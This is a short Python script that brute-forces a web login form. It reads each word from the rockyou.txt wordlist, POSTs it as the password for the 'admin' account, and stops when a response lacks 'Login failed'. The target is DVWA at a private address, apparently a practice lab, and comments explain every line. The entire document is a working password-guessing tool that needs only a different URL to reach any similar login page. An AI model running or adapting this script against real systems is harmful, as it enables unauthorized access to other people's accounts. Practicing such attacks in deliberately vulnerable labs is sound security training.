import requests, sys
from colorama import Fore, init

init()

def guess_password(target_url, username, wordlist_path, action_type):
   parameters = {"username": username, 'password': '', 'Login': action_type}  # Create a dictionary 'parameters' with username, empty password, and action_type.
   # Open the file containing our wordlist 'rockyou.txt' for reading.
   with open(wordlist_path, 'r') as word_list:
       # Loop through each word in the wordlist.
       for each_word in word_list:
           word = each_word.strip()  # Remove whitespace from the word.
           parameters['password'] = word  # Set the password parameter to the current word.
           # Send an HTTP POST request to the target_url with the current 'parameters'.
           output = requests.post(target_url, data=parameters)
           # Check if the response content does not contain "Login failed".
           if 'Login failed' not in output.content.decode('utf-8'):
         # If the condition is met, print a success message with the found password.
               print(f"{Fore.GREEN} [+] Password Found! >>> {word} ")
               sys.exit()  # Exit the script.
   # If no password is found after iterating through the wordlist, print a failure message.
   print(f"{Fore.RED} [-] Password not found.")

guess_password("http://192.168.134.129/dvwa/login.php", 'admin', 'C:\\Users\\muham\\Documents\\wordlists\\rockyou.txt', 'submit')